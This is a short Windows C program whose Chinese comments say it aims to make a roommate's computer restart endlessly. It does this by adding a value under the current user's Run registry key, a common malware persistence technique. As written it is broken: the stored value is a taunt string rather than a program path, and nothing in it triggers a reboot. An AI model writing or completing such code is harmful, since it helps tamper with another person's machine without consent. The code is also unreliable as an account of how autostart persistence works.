#include <Windows.h>
#include <stdio.h>

//让室友的电脑无限重启
int main()
{
	//要想实现<==开机自启动
	//操作注册表<==Window8s非常重要的东西 “regedit”
	//自启动==>"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run"
	//ie的Main==>"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main"
	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\run", 0, KEY_ALL_ACCESS, &hKey);
	TCHAR szInfo[260] = L"干倒室友,让他无限重启";
	RegSetValueEx(hKey,L"恶搞室友无限重启",0,REG_SZ,(BYTE *)szInfo,260);
	return 0;
}